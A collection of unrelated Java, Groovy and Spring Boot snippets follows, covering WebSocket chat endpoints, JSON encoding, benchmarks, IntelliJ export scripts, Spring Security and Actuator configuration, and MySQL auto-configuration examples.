    
    @OnMessage
    public void mensaje(Mensaje mensaje) throws IOException, EncodeException {
        for(Session sesion : conectados){
            sesion.getBasicRemote().sendObject(mensaje);
        }
    }
    
}


import java.io.IOException;
import java.io.Reader;
import javax.json.Json;
import javax.json.JsonObject;
import javax.json.JsonReader;
import javax.websocket.DecodeException;
import javax.websocket.Decoder;
import javax.websocket.EndpointConfig;

public class DecoderMensaje implements Decoder.TextStream<Mensaje> {

    @Override
    public Mensaje decode(Reader reader)
            throws DecodeException, IOException {
        
        Mensaje mensaje = new Mensaje();
        
        try (JsonReader jsonReader = Json.createReader(reader)) {
            JsonObject json = jsonReader.readObject();
            mensaje.setNombre(json.getString("nombre"));
            mensaje.setMensaje(json.getString("mensaje"));
        }
        
        return mensaje;
    }

    @Override
    public void init(EndpointConfig config) {
    }

    @Override
    public void destroy() {
    }
    
}

import java.io.IOException;
import java.io.Writer;
import java.math.BigDecimal;
import javax.json.Json;
import javax.json.JsonObject;
import javax.json.JsonWriter;
import javax.websocket.EncodeException;
import javax.websocket.Encoder;
import javax.websocket.EndpointConfig;

public class EncoderMensaje implements Encoder.TextStream<Mensaje> {

    @Override
    public void encode(Mensaje object, Writer writer) throws EncodeException, IOException {
        JsonObject json = Json.createObjectBuilder()
             .add("nombre", object.getNombre())
             .add("mensaje", object.getMensaje())
                .build();
        try (JsonWriter jsonWriter = Json.createWriter(writer)){
            jsonWriter.writeObject(json);
        }
    }

    @Override
    public void init(EndpointConfig config) {
    }

    @Override
    public void destroy() {
    }
    
}

public class Mensaje {
    private String nombre;
    private String mensaje;

    public Mensaje() {
    }

    public String getNombre() {
        return nombre;
    }

    public void setNombre(String nombre) {
        this.nombre = nombre;
    }

    public String getMensaje() {
        return mensaje;
    }

    public void setMensaje(String mensaje) {
        this.mensaje = mensaje;
    }   
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.ejb.Schedule;
import javax.ejb.Singleton;
import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.RemoteEndpoint;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

/**
 *
 * @author Alexys
 */
@ServerEndpoint("/mensajeATodos")
@Singleton
public class WSDTodos {

    private static final Logger LOGGER = Logger.getLogger(WSDTodos.class.getName());
    
    //Lista de sesiones conectados
    private static final List<Session> conexiones = new ArrayList<>();
    
    /**
     * Evento que se ejecuta cuando un cliente se conecta
     *
     * @param session La sesion del cliente
     */
    @OnOpen
    public void iniciaSesion(Session session) {
        LOGGER.log(Level.INFO, "Iniciando la conexion de {0}", session.getId());
        conexiones.add(session); //Simplemente, lo agregamos a la lista
    }
    
    /**
     * Evento que se ejecuta cuando se pierde una conexion.
     *
     * @param session La sesion del cliente
     */
    @OnClose
    public void finConexion(Session session) {
        LOGGER.info("Terminando la conexion");
        if (conexiones.contains(session)) { // se averigua si está en la colección
            try {
                LOGGER.log(Level.INFO, "Terminando la conexion de {0}", session.getId());
                session.close(); //se cierra la conexión
                conexiones.remove(session); // se retira de la lista
            } catch (IOException ex) {
                LOGGER.log(Level.SEVERE, null, ex);
            }
        }
    }
    
    /**
     * Enviaremos un mensaje a todos los conectados
     */
    @Schedule(second = "*/10", minute = "*", hour = "*", persistent = false)
    public void notificar() {
        LOGGER.log(Level.INFO, "Enviando notificacion a {0} conectados", conexiones.size());
        String mensaje = "Son las " + (new java.util.Date()) + " y hay " + conexiones.size() + " conectados ";  // el mensaje a enviar
        for (Session sesion : conexiones) { //recorro toda la lista de conectados
            RemoteEndpoint.Basic remote = sesion.getBasicRemote(); //tomo la conexion remota con el cliente...
            try {
                remote.sendText(mensaje); //... y envío el mensajue
            } catch (IOException ex) {
                LOGGER.log(Level.WARNING, null, ex);
            }
        }
    }
    
    /**
     * Solo es un metodo que atiende las peticiones
     *
     * @param mensaje
     */
    @OnMessage
    public void onMessage(String mensaje) {
        for(Session sesionAbierta:conexiones){
            try {
                sesionAbierta.getBasicRemote().sendText("Hola a todos con este mensaje:" + mensaje);
            } catch (IOException ex) {
                LOGGER.log(Level.WARNING, null, ex);
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
mvn compile exec:java -Dexec.mainClass=course.BlogController
--------------------------------------------------------------------------------------------------------
@startuml

class Handler {
doGet
doPost
}

abstract class AbstractCommand {
process
}
class ConcreteCommand1 {
process
}
class ConcreteCommand2 {
process
}

Handler .right.> AbstractCommand
AbstractCommand <|-- ConcreteCommand1
AbstractCommand <|-- ConcreteCommand2

@enduml
--------------------------------------------------------------------------------------------------------
class A {}
class B extends A {}

public class Benchmark {

    public static final Object a = new A();
    public static final Object b = new B();

    @Benchmark
    @BenchmarkMode(Mode.Throughput)
    @OutputTimeUnit(TimeUnit.MICROSECONDS)
    public boolean testInstanceOf()
    {
        return b instanceof A;
    }

    @Benchmark
    @BenchmarkMode(Mode.Throughput)
    @OutputTimeUnit(TimeUnit.MICROSECONDS)
    public boolean testIsInstance()
    {
        return A.class.isInstance(b);
    }

    @Benchmark
    @BenchmarkMode(Mode.Throughput)
    @OutputTimeUnit(TimeUnit.MICROSECONDS)
    public boolean testIsAssignableFrom()
    {
        return A.class.isAssignableFrom(b.getClass());
    }

    public static void main(String[] args) throws RunnerException {
        Options opt = new OptionsBuilder()
                .include(TestPerf2.class.getSimpleName())
                .warmupIterations(20)
                .measurementIterations(2000)
                .forks(1)
                .build();

        new Runner(opt).run();
    }
}
--------------------------------------------------------------------------------------------------------
	headers.add(new InternetHeader("Return-Path", null));
	headers.add(new InternetHeader("Received", null));
	headers.add(new InternetHeader("Resent-Date", null));
	headers.add(new InternetHeader("Resent-From", null));
	headers.add(new InternetHeader("Resent-Sender", null));
	headers.add(new InternetHeader("Resent-To", null));
	headers.add(new InternetHeader("Resent-Cc", null));
	headers.add(new InternetHeader("Resent-Bcc", null));
	headers.add(new InternetHeader("Resent-Message-Id", null));
	headers.add(new InternetHeader("Date", null));
	headers.add(new InternetHeader("From", null));
	headers.add(new InternetHeader("Sender", null));
	headers.add(new InternetHeader("Reply-To", null));
	headers.add(new InternetHeader("To", null));
	headers.add(new InternetHeader("Cc", null));
	headers.add(new InternetHeader("Bcc", null));
	headers.add(new InternetHeader("Message-Id", null));
	headers.add(new InternetHeader("In-Reply-To", null));
	headers.add(new InternetHeader("References", null));
	headers.add(new InternetHeader("Subject", null));
	headers.add(new InternetHeader("Comments", null));
	headers.add(new InternetHeader("Keywords", null));
	headers.add(new InternetHeader("Errors-To", null));
	headers.add(new InternetHeader("MIME-Version", null));
	headers.add(new InternetHeader("Content-Type", null));
	headers.add(new InternetHeader("Content-Transfer-Encoding", null));
	headers.add(new InternetHeader("Content-MD5", null));
	headers.add(new InternetHeader(":", null));
	headers.add(new InternetHeader("Content-Length", null));
	headers.add(new InternetHeader("Status", null));
--------------------------------------------------------------------------------------------------------
import com.intellij.database.model.DasTable
import com.intellij.database.util.Case
import com.intellij.database.util.DasUtil

/*
 * Available context bindings:
 *   SELECTION   Iterable<DasObject>
 *   PROJECT     project
 *   FILES       files helper
 */

packageName = "com.sample;"
typeMapping = [
  (~/(?i)int/)                      : "long",
  (~/(?i)float|double|decimal|real/): "double",
  (~/(?i)datetime|timestamp/)       : "java.sql.Timestamp",
  (~/(?i)date/)                     : "java.sql.Date",
  (~/(?i)time/)                     : "java.sql.Time",
  (~/(?i)/)                         : "String"
]

FILES.chooseDirectoryAndSave("Choose directory", "Choose where to store generated files") { dir ->
  SELECTION.filter { it instanceof DasTable }.each { generate(it, dir) }
}

def generate(table, dir) {
  def className = javaName(table.getName(), true)
  def fields = calcFields(table)
  new File(dir, className + ".java").withPrintWriter { out -> generate(out, className, fields) }
}

def generate(out, className, fields) {
  out.println "package $packageName"
  out.println ""
  out.println ""
  out.println "public class $className {"
  out.println ""
  fields.each() {
    if (it.annos != "") out.println "  ${it.annos}"
    out.println "  private ${it.type} ${it.name};"
  }
  out.println ""
  fields.each() {
    out.println ""
    out.println "  public ${it.type} get${it.name.capitalize()}() {"
    out.println "    return ${it.name};"
    out.println "  }"
    out.println ""
    out.println "  public void set${it.name.capitalize()}(${it.type} ${it.name}) {"
    out.println "    this.${it.name} = ${it.name};"
    out.println "  }"
    out.println ""
  }
  out.println "}"
}

def calcFields(table) {
  DasUtil.getColumns(table).reduce([]) { fields, col ->
    def spec = Case.LOWER.apply(col.getDataType().getSpecification())
    def typeStr = typeMapping.find { p, t -> p.matcher(spec).find() }.value
    fields += [[
                 name : javaName(col.getName(), false),
                 type : typeStr,
                 annos: ""]]
  }
}

def javaName(str, capitalize) {
  def s = com.intellij.psi.codeStyle.NameUtil.splitNameIntoWords(str)
    .collect { Case.LOWER.apply(it).capitalize() }
    .join("")
    .replaceAll(/[^\p{javaJavaIdentifierPart}[_]]/, "_")
  capitalize || s.length() == 1? s : Case.LOWER.apply(s[0]) + s[1..-1]
}
--------------------------------------------------------------------------------------------------------
/**
  * Save the state of the <tt>HashMap</tt> instance to a stream (i.e.,
  * serialize it)
  *
  * @serialData The <i>capacity</i> of the HashMap (the length of the
  *             bucket array) is emitted (int), followed by the
  *             <i>size</i> (an int, the number of key-value
  *             mappings), followed by the key (Object) and value (Object)
  *             for each key-value mapping.  The key-value mappings are
  *             emitted in no particular order.
  */
      private void writeObject(java.io.ObjectOutputStream s)
             throws IOException
         {
             Iterator<Map.Entry<K,V>> i =
                 (size > 0) ? entrySet0().iterator() : null;

            // Write out the threshold, loadfactor, and any hidden stuff
            s.defaultWriteObject();

            // Write out number of buckets
            s.writeInt(table.length);

            // Write out size (number of Mappings)
            s.writeInt(size);

            // Write out keys and values (alternating)
            if (i != null) {
                while (i.hasNext()) {
                    Map.Entry<K,V> e = i.next();
                    s.writeObject(e.getKey());
                    s.writeObject(e.getValue());
                }
            }
        }
--------------------------------------------------------------------------------------------------------
/*
 * Available context bindings:
 *   COLUMNS     List<DataColumn>
 *   ROWS        Iterable<DataRow>
 *   OUT         { append() }
 *   FORMATTER   { format(row, col); formatValue(Object, col) }
 *   TRANSPOSED  Boolean
 * plus ALL_COLUMNS, TABLE, DIALECT
 *
 * where:
 *   DataRow     { rowNumber(); first(); last(); data(): List<Object>; value(column): Object }
 *   DataColumn  { columnNumber(), name() }
 */


import java.util.regex.Pattern

NEWLINE = System.getProperty("line.separator")

pattern = Pattern.compile("[^\\w\\d]")
def escapeTag(name) {
  name = pattern.matcher(name).replaceAll("_")
  return name.isEmpty() || !Character.isLetter(name.charAt(0)) ? "_$name" : name
}
def printRow = { values, rowTag, namer, valueToString ->
  OUT.append("$NEWLINE<$rowTag>$NEWLINE")
  values.eachWithIndex { it, index ->
    def tag = namer(it, index)
    def str = valueToString(it)
    OUT.append("  <$tag>$str</$tag>$NEWLINE")
  }
  OUT.append("</$rowTag>")
}

OUT.append(
"""<?xml version="1.0" encoding="UTF-8"?>
<data>""")

if (!TRANSPOSED) {
  ROWS.each { row -> printRow(COLUMNS, "row", {it, _ -> escapeTag(it.name())}) { FORMATTER.format(row, it) } }
}
else {
  def values = COLUMNS.collect { new ArrayList<String>() }
  ROWS.each { row -> COLUMNS.eachWithIndex { col, i -> values[i].add(FORMATTER.format(row, col)) } }
  values.eachWithIndex { it, index -> printRow(it, escapeTag(COLUMNS[index].name()), { _, i -> "row${i + 1}" }, { it }) }
}

OUT.append("""
</data>
""")
--------------------------------------------------------------------------------------------------------
import java.util.Base64;
import java.util.UUID;
import java.io.UnsupportedEncodingException;

public class HelloWorld {

   public static void main(String args[]) {

      try {
		
         // Encode using basic encoder
         String base64encodedString = Base64.getEncoder().encodeToString(
            "TutorialsPoint?java8".getBytes("utf-8"));
         System.out.println("Base64 Encoded String (Basic) :" + base64encodedString);
		
         // Decode
         byte[] base64decodedBytes = Base64.getDecoder().decode(base64encodedString);
		
         System.out.println("Original String: " + new String(base64decodedBytes, "utf-8"));
         base64encodedString = Base64.getUrlEncoder().encodeToString(
            "TutorialsPoint?java8".getBytes("utf-8"));
         System.out.println("Base64 Encoded String (URL) :" + base64encodedString);
		
         StringBuilder stringBuilder = new StringBuilder();
		
         for (int i = 0; i < 10; ++i) {
            stringBuilder.append(UUID.randomUUID().toString());
         }
		
         byte[] mimeBytes = stringBuilder.toString().getBytes("utf-8");
         String mimeEncodedString = Base64.getMimeEncoder().encodeToString(mimeBytes);
         System.out.println("Base64 Encoded String (MIME) :" + mimeEncodedString);

      } catch(UnsupportedEncodingException e) {
         System.out.println("Error :" + e.getMessage());
      }
   }
}
--------------------------------------------------------------------------------------------------------
@Component
@Configuration
public class DataSources {
    @Bean
    @Primary
    @ConfigurationProperties(prefix="first.datasource")
    public DataSource getPrimaryDataSource() {
        return DataSourceBuilder.create().build();
    }

    @Bean
    @ConfigurationProperties(prefix="second.datasource")
    public DataSource getSecondDataSource() {
        return DataSourceBuilder.create().build();
    }

    @Bean
    @ConfigurationProperties(prefix="third.final.datasource")
    public DataSource getThirdFinalDataSource() {
        return DataSourceBuilder.create().build();
    }
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.configuration;

import com.paragon.microservices.distributor.model.domain.AuthenticatedUser;
import com.paragon.microservices.distributor.property.RoleProperty;
import com.paragon.microservices.distributor.system.filter.JwtAuthenticationFilter;
import com.paragon.microservices.distributor.system.handler.SecurityAuditorAwareHandler;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Description;
import org.springframework.data.domain.AuditorAware;
import org.springframework.http.HttpStatus;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.builders.WebSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.access.AccessDeniedHandler;
import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

//import com.paragon.microservices.distributor.property.CorsProperty;

@EnableWebSecurity
@EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true)
@RequiredArgsConstructor
@Description("Paragon MicroServices Distributor security configuration")
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
    private final JwtAuthenticationFilter authenticationFilter;
    private final RoleProperty roleProperty;
//    private final CorsProperty corsProperty;

    @Override
    protected void configure(final HttpSecurity http) throws Exception {
        http
                .cors()
                .and().csrf().disable()
                .exceptionHandling()
                .accessDeniedHandler(this.accessDeniedHandler())
                .and().authorizeRequests()
                .antMatchers(this.roleProperty.getAdmin().getPaths().toArray(new String[0])).hasAuthority(this.roleProperty.getAdmin().getCode())
                .antMatchers("/swagger**").permitAll()
                .anyRequest().authenticated()
                .and().addFilterBefore(this.authenticationFilter, BasicAuthenticationFilter.class)
//                .addFilterBefore(this.corsFilter(), BasicAuthenticationFilter.class)
                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                .and().headers().frameOptions().disable().cacheControl().disable();
    }

//    @Bean
//    public CorsFilter corsFilter() {
//        final UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
//        final CorsConfiguration config = new CorsConfiguration();
//        config.setAllowedMethods(this.corsProperty.getAllowedMethods());
//        config.setAllowedOrigins(this.corsProperty.getAllowedOrigins());
//        config.setAllowedHeaders(this.corsProperty.getAllowedHeaders());
//        config.setExposedHeaders(this.corsProperty.getExposedHeaders());
//        if (!CollectionUtils.isEmpty(config.getAllowedOrigins())) {
//            source.registerCorsConfiguration("/api/**", config);
//            source.registerCorsConfiguration("/v2/api-docs", config);
//        }
//        return new CorsFilter(source);
//    }

    @Bean
    public AuditorAware<AuthenticatedUser> auditorAware() {
        return new SecurityAuditorAwareHandler();
    }

    @Bean
    public AccessDeniedHandler accessDeniedHandler() {
        return new CustomAccessDeniedHandler();
    }

    @Override
    public void configure(final WebSecurity web) {
        web.ignoring().antMatchers("/resources/**");
    }

    private static class CustomAccessDeniedHandler implements AccessDeniedHandler {

        @Override
        public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException ex) throws IOException {
            response.sendError(HttpStatus.FORBIDDEN.value(), "Access denied");
        }
    }
//    @Override
//    protected MethodSecurityExpressionHandler createExpressionHandler() {
//        return this.defaultMethodSecurityExpressionHandler();
//    }
//
//    @Bean(name = "defaultMethodSecurityExpressionHandler")
//    public MethodSecurityExpressionHandler defaultMethodSecurityExpressionHandler() {
//        return new DefaultMethodSecurityExpressionHandler();
//    }
}

--------------------------------------------------------------------------------------------------------
 * <pre class="code">
 * &#064;Configuration
 * &#064;ComponentScan(basePackageClasses = { MyConfiguration.class })
 * public class MyConfiguration extends WebMvcConfigurationSupport {
 *
 * 	   &#064;Override
 *	   public void addFormatters(FormatterRegistry formatterRegistry) {
 *         formatterRegistry.addConverter(new MyConverter());
 *	   }
 *
 *	   &#064;Bean
 *	   public RequestMappingHandlerAdapter requestMappingHandlerAdapter() {
 *         // Create or delegate to "super" to create and
 *         // customize properties of RequestMappingHandlerAdapter
 *	   }
 * }
 * </pre>
--------------------------------------------------------------------------------------------------------
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-compiler-plugin</artifactId>
    <version>3.7.0</version>
    <configuration>
        <compilerArgs>
            <arg>-Xlint:-path</arg>
        </compilerArgs>
    </configuration>
</plugin>
--------------------------------------------------------------------------------------------------------
mvn  clean install tomcat7:run-war
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping("/customers")
public class CustomerController {
    @Autowired
    private CustomerDataService customerDataService;

    @RequestMapping(method = RequestMethod.GET)
    private String handleRequest (Model model) {
        model.addAttribute("customerList", customerDataService.getAllUsers());
        return "customers";
    }
}
--------------------------------------------------------------------------------------------------------
ConditionalOnProperty(
  name = "usemysql", 
  havingValue = "local")
@ConditionalOnMissingBean
public DataSource dataSource() {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
  
    dataSource.setDriverClassName("com.mysql.cj.jdbc.Driver");
    dataSource.setUrl("jdbc:mysql://localhost:3306/myDb?createDatabaseIfNotExist=true");
    dataSource.setUsername("mysqluser");
    dataSource.setPassword("mysqlpass");
 
    return dataSource;
}


@Bean(name = "dataSource")
@ConditionalOnProperty(
  name = "usemysql", 
  havingValue = "custom")
@ConditionalOnMissingBean
public DataSource dataSource2() {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
         
    dataSource.setDriverClassName("com.mysql.cj.jdbc.Driver");
    dataSource.setUrl(env.getProperty("mysql.url"));
    dataSource.setUsername(env.getProperty("mysql.user") != null
      ? env.getProperty("mysql.user") : "");
    dataSource.setPassword(env.getProperty("mysql.pass") != null
      ? env.getProperty("mysql.pass") : "");
         
    return dataSource;
}
@ConditionalOnResource(
  resources = "classpath:mysql.properties")
@Conditional(HibernateCondition.class)
Properties additionalProperties() {
    Properties hibernateProperties = new Properties();
 
    hibernateProperties.setProperty("hibernate.hbm2ddl.auto", 
      env.getProperty("mysql-hibernate.hbm2ddl.auto"));
    hibernateProperties.setProperty("hibernate.dialect", 
      env.getProperty("mysql-hibernate.dialect"));
    hibernateProperties.setProperty("hibernate.show_sql", 
      env.getProperty("mysql-hibernate.show_sql") != null
      ? env.getProperty("mysql-hibernate.show_sql") : "false");
    return hibernateProperties;
}

static class HibernateCondition extends SpringBootCondition {
 
    private static String[] CLASS_NAMES
      = { "org.hibernate.ejb.HibernateEntityManager", 
          "org.hibernate.jpa.HibernateEntityManager" };
 
    @Override
    public ConditionOutcome getMatchOutcome(ConditionContext context, 
      AnnotatedTypeMetadata metadata) {
  
        ConditionMessage.Builder message
          = ConditionMessage.forCondition("Hibernate");
        return Arrays.stream(CLASS_NAMES)
          .filter(className -> ClassUtils.isPresent(className, context.getClassLoader()))
          .map(className -> ConditionOutcome
            .match(message.found("class")
            .items(Style.NORMAL, className)))
          .findAny()
          .orElseGet(() -> ConditionOutcome
            .noMatch(message.didNotFind("class", "classes")
            .items(Style.NORMAL, Arrays.asList(CLASS_NAMES))));
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@SpringBootTest(
  classes = AutoconfigurationApplication.class)
@EnableJpaRepositories(
  basePackages = { "com.baeldung.autoconfiguration.example" })
public class AutoconfigurationTest {
 
    @Autowired
    private MyUserRepository userRepository;
 
    @Test
    public void whenSaveUser_thenOk() {
        MyUser user = new MyUser("user@email.com");
        userRepository.save(user);
    }
}

@Configuration
@EnableAutoConfiguration(
  exclude={MySQLAutoconfiguration.class})
public class AutoconfigurationApplication {
    //...
}

org.springframework.boot.autoconfigure.EnableAutoConfiguration=com.baeldung.autoconfiguration.MySQLAutoconfiguration
--------------------------------------------------------------------------------------------------------
MessageSourceAutoConfiguration 
--------------------------------------------------------------------------------------------------------
spring init -d=web,actuator -n=actuator-demo actuator-demo
--------------------------------------------------------------------------------------------------------
# INFO ENDPOINT CONFIGURATION
info.app.name=@project.name@
info.app.description=@project.description@
info.app.version=@project.version@
info.app.encoding=@project.build.sourceEncoding@
info.app.java.version=@java.version@
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.actuate.autoconfigure.security.servlet.EndpointRequest;
import org.springframework.boot.actuate.context.ShutdownEndpoint;
import org.springframework.boot.autoconfigure.security.servlet.PathRequest;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

@Configuration
public class ActuatorSecurityConfig extends WebSecurityConfigurerAdapter {

    /*
        This spring security configuration does the following

        1. Restrict access to the Shutdown endpoint to the ACTUATOR_ADMIN role.
        2. Allow access to all other actuator endpoints.
        3. Allow access to static resources.
        4. Allow access to the home page (/).
        5. All other requests need to be authenticated.
        5. Enable http basic authentication to make the configuration complete.
           You are free to use any other form of authentication.
     */

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .authorizeRequests()
                    .requestMatchers(EndpointRequest.to(ShutdownEndpoint.class))
                        .hasRole("ACTUATOR_ADMIN")
                    .requestMatchers(EndpointRequest.toAnyEndpoint())
                        .permitAll()
                    .requestMatchers(PathRequest.toStaticResources().atCommonLocations())
                        .permitAll()
                    .antMatchers("/")
                        .permitAll()
                    .antMatchers("/**")
                        .authenticated()
                .and()
                .httpBasic();
    }
}
--------------------------------------------------------------------------------------------------------
Type listType = new TypeToken<List<String>>() {}.getType();
List<String> characters = modelMapper.map(numbers, listType);
--------------------------------------------------------------------------------------------------------
To run the utility, go to the directory where the Lucene library files are located and run the following command: 
java -ea:org.apache.lucene... org.apache.lucene.index.CheckIndex INDEX_PATH -fix
--------------------------------------------------------------------------------------------------------
    BigInteger modulus = new BigInteger(Base64.getDecoder().decode(publicKeyString));
    BigInteger exponent = new BigInteger(Base64.getDecoder().decode("AQAB"));

    RSAPublicKeySpec keySpec = new RSAPublicKeySpec(modulus, exponent);
    KeyFactory keyFactory = KeyFactory.getInstance("RSA");
    PublicKey pubKey = keyFactory.generatePublic(keySpec);

    byte[] sigToVerify = Base64.getDecoder().decode(signatureString);
    Signature sig = Signature.getInstance("MD5WithRSA");
    sig.initVerify(pubKey);
    boolean verifies = sig.verify(sigToVerify);
--------------------------------------------------------------------------------------------------------
eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiwidHlwIjoiSldUIn0.eyJqdGkiOiI4ZjZmNWZkOC00NzhmLTQ0Y2MtYTZmZS0zMzQzNmM2ZTBkZWMiLCJ1c2VyaWQiOiI1N2Q0ZTFkOC00NWQ4LTQ2NjItNTIzYi0wOGQ3MjYxNmU4MmQiLCJvd25lcmlkIjoiODc2ZWFmNDQtNzUyMy00YjEzLThhMmEtNzBlYWVkNDU4OTAyIiwiZXhwIjoxNTY2NDY0ODEzLCJpc3MiOiJSZWdpc3RyeSIsImF1ZCI6IlJlZ2lzdHJ5In0.p4gbYXYBRuTPMNS81UrPvx06BFh8d3p_oRI0KVVRtCUiaUd6sAkWequyVJZEdmiYGvcqb6OHj1BAiXnAR1Cibg6FlKeVS31SyJqHkZWlaDDR1LDmu4SJPZ8cixYeAWBMXE_10EbjLxFY3nBOEg1vtUM3WNTws2pfoAFA8oqb9uqjeI_33_9fW206hLngb98ICr8WWJFcfRTsAHc0pc-XRQCkZH8LKpL-QpT6HqPxzP_sStxPHvhYZRcHFXxVwrcAEOtthfgFReAx0XwVEJXYsiRrTKApLyYvVIL7GvbJ6dyinWOKNCU861bsdsGiQmK7-HdQwAya4nUl_IEGQlnYzw
--------------------------------------------------------------------------------------------------------
@SpringBootApplication 
@EnableOAuth2Client
@EnableAuthorizationServer
@Order(SecurityProperties.ACCESS_OVERRIDE_ORDER)
public class MsAuthorizationGmailApplication extends WebSecurityConfigurerAdapter {

    @Autowired
    OAuth2ClientContext oauth2ClientContext;

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.antMatcher("/**").authorizeRequests().antMatchers("/", "/login**", "/webjars/**").permitAll().anyRequest()
            .authenticated().and().exceptionHandling()
            .authenticationEntryPoint(new LoginUrlAuthenticationEntryPoint("/login/gmail")).and().logout()
            .logoutSuccessUrl("/").permitAll().and().csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()).and()
            .addFilterBefore(ssoFilter(), BasicAuthenticationFilter.class);
    }

    @Bean
    @ConfigurationProperties("gmail")
    public ClientResources gmail() {
        return new ClientResources();
    }

    private Filter ssoFilter() {
        CompositeFilter filter = new CompositeFilter();
        List<Filter> filters = new ArrayList<>();
        filters.add(ssoFilter(gmail(), "/login/gmail"));
        filter.setFilters(filters);
        return filter;
    }

    private Filter ssoFilter(ClientResources client, String path) {
        OAuth2ClientAuthenticationProcessingFilter filter = new     OAuth2ClientAuthenticationProcessingFilter(
            path);
        OAuth2RestTemplate template = new OAuth2RestTemplate(client.getClient(), oauth2ClientContext);
        filter.setRestTemplate(template);
        filter.setTokenServices(JwtConfig.tokenServices());
        return filter;
    }

    public static void main(String[] args) {
        SpringApplication.run(MsAuthorizationGmailApplication.class, args);
    }

}
--------------------------------------------------------------------------------------------------------
import org.hibernate.search.jpa.FullTextEntityManager;
import org.hibernate.search.jpa.Search;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.DependsOn;
import org.springframework.context.annotation.Description;

import javax.persistence.EntityManagerFactory;

@Configuration
@Description("Paragon MicroServices Distributor index search configuration")
public class IndexSearchConfiguration {

    @Bean
    @DependsOn({"entityManagerFactory"})
    public LuceneIndexServiceBean luceneIndexServiceBean(final EntityManagerFactory entityManagerFactory) {
        final LuceneIndexServiceBean luceneIndexServiceBean = new LuceneIndexServiceBean(entityManagerFactory);
        luceneIndexServiceBean.triggerIndexing();
        return luceneIndexServiceBean;
    }

    public static class LuceneIndexServiceBean {
        private FullTextEntityManager fullTextEntityManager;

        public LuceneIndexServiceBean(final EntityManagerFactory entityManagerFactory) {
            this.fullTextEntityManager = Search.getFullTextEntityManager(entityManagerFactory.createEntityManager());
        }

        public void triggerIndexing() {
            try {
                this.fullTextEntityManager.createIndexer().startAndWait();
            } catch (Exception e) {
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
public class TypeUtils {
  public static <T> TypeToken<List<T>> listType() {
    return new TypeToken<List<T>>() {};
  }
  
  public abstract class TypeHandler<T> {
    final TypeToken<T> type = new TypeToken<T>(getClass()) {};
  }
}

TypeToken<List<String>> stringListType = Util.<String>listType();

Authorization

Bearer 
--------------------------------------------------------------------------------------------------------
@Bean
public SecurityWebFilterChain securityWebFilterChain(
  ServerHttpSecurity http) {
    return http.authorizeExchange()
      .pathMatchers("/actuator/**").permitAll()
      .anyExchange().authenticated()
      .and().build();
}
--------------------------------------------------------------------------------------------------------
@RestController
public class Internationalization {

    @Autowired
    @Qualifier("messageResourceSB")
    MessageSource messageSource;

    @GetMapping(path = "/sayHelloIntern")
    public String sayHello(@RequestHeader(name="Accept-Language",required = false) Locale locale) {
        return messageSource.getMessage("message.greeting", null, locale);
    }
}
--------------------------------------------------------------------------------------------------------

@ConditionalOnBean(value=MyBean.class, name="NameOfMyBean")
@Controller
public class MyController{

  ...
}

--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@TestPropertySource(properties = 
 "spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration")
public class ExcludeAutoConfigIntegrationTest {
    // ...
}


@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@ActiveProfiles("test")
public class ExcludeAutoConfigIntegrationTest {
    // ...
}
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration


@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@EnableAutoConfiguration(exclude=SecurityAutoConfiguration.class)
public class ExcludeAutoConfigIntegrationTest {
 
    @Test
    public void givenSecurityConfigExcluded_whenAccessHome_thenNoAuthenticationRequired() {
        int statusCode = RestAssured.get("http://localhost:8080/").statusCode();
         
        assertEquals(HttpStatus.OK.value(), statusCode);
    }
}


@SpringBootApplication(exclude=SecurityAutoConfiguration.class)
public class TestApplication {
 
    public static void main(String[] args) {
        SpringApplication.run(TestApplication.class, args);
    }
}

@RunWith(SpringRunner.class)
